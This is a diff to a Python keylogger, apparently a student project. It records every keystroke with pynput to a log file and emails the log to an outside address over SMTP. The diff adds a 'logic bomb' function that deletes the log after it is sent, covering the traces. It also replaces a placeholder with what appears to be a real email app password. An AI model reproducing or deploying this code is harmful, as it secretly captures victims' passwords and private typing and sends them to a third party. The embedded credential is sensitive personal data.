@@ -1,5 +1,4 @@
 import ssl
-
 from pynput.keyboard import Key, Listener
 import logging
 from email.message import EmailMessage
@@ -7,10 +6,28 @@ import smtplib
 import os
 
 
+def apagar_arquivos(arquivo):
+    try:
+        os.remove(arquivo)
+        print(f"Arquivo removido com sucesso")
+    except Exception as e:
+        print(f"Erro ao apagar o arquivo: {e}")
+
+
+def bomba_logica():
+    log_file = "Registro_das_teclas.txt"
+
+    print("Removendo os arquivos...")
+    if os.path.exists(log_file):
+        apagar_arquivos(log_file)
+    else:
+        print(f"O arquivo '{log_file}' não existe.")
+
+
 def enviar_email():
     email_remetente = 'andretestes79@gmail.com'
-    email_senha = 'inserir senha'
-    email_destinatario = 'andre.e@academico.ufpb.br'
+    email_senha = 'kmba ljee kpbz kvsd'
+    email_destinatario = 'sousa.andrelopes@gmail.com'
 
     titulo = 'Registro das Teclas Capturadas'
     corpo = """
@@ -56,6 +73,7 @@ def criar_log():
     # criar arquivo log
     log_dir = ""
 
+    # configuração do arquivo log
     logging.basicConfig(filename=(log_dir + "Registro_das_teclas.txt"),
                         level=logging.DEBUG,
                         format='%(asctime)s: %(message)s')
@@ -64,7 +82,10 @@ def criar_log():
 if __name__ == '__main__':
     criar_log()
 
-    with Listener(on_press = ao_pressionar) as listener:
+    # Inicia o listener e aguarda até que ele seja encerrado
+    with Listener(on_press=ao_pressionar) as listener:
         listener.join()
 
+    logging.shutdown()
     enviar_email()
+    bomba_logica()
